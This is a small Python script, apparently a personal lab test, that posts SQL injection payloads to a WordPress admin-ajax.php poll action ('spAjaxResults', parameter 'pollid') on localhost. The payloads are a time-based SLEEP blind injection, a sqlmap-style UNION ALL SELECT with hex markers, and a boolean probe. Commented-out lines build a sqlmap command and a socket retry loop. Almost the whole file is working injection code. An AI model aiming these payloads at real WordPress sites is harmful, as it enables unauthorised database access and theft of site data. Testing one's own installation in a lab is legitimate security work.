#coding:utf-8
import sys, os
import random
import time
import socket
import urllib.request
import requests

## params
url = "http://localhost/injections/wordp/wp-admin/admin-ajax.php" 

def oracle(url, injtxt): 
    payload = {'action': 'spAjaxResults', 'pollid': '2'+ injtxt}
    r = requests.post(url, data=payload)    
    print("[POST]", r.url)
    print(r.text)


## tests
oracle(url, '')
oracle(url, ' AND (SELECT 1158 FROM (SELECT(SLEEP(5)))eipW)')
oracle(url, ' UNION ALL SELECT 6050,6050,6050,6050,6050,CONCAT(0x71786a7171,0x574f546a6e7944764f597450476f724d73677867664f754967476f59636c5054705a4c7853736143,0x7170767871),6050--')
oracle(url, ' AND 6034=6034')











#with urllib.request.urlopen('http://python.org/') as response:
#   html = response.read()  
# print(html)                 http://localhost/injections/wordp/wp-admin/admin-ajax.php




#req = urllib.request.Request('http://localhost/injections/wordp/wp-admin/admin-ajax.php')
#try:
#    with urllib.request.urlopen(req) as response:
 #       the_page = response.read()   
 #       print(the_page)
#except urllib.error.HTTPError as e:
 #   print(e.code)
  #  print(e.read())   

#  req = urllib.request.Request('http://localhost/injections/wordp/wp-admin/admin-ajax.php')
# with urllib.request.urlopen(req) as response:
#    the_page = response.read()   
#    print(the_page)

## params
#address, port = "127.0.0.10", random.randint(1025, 65535)
#url = "http://%s:%d/?id=1" % (address, port)
#cmd = "%s %s %s --batch" % (sys.executable, 
#                           os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "sqlmap.py")), 
#                           "-u <url>".replace("<url>",url))
#print(cmd)





## connexion au serveur 
#while True:
 #   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  #  try:
  #      s.connect((address, port))
   #     break
   # except:
    #    time.sleep(1)    
     #   print("┗|｀O′|┛ [ECHEC] connexion serveur : nouvelle tentative dans 1s")

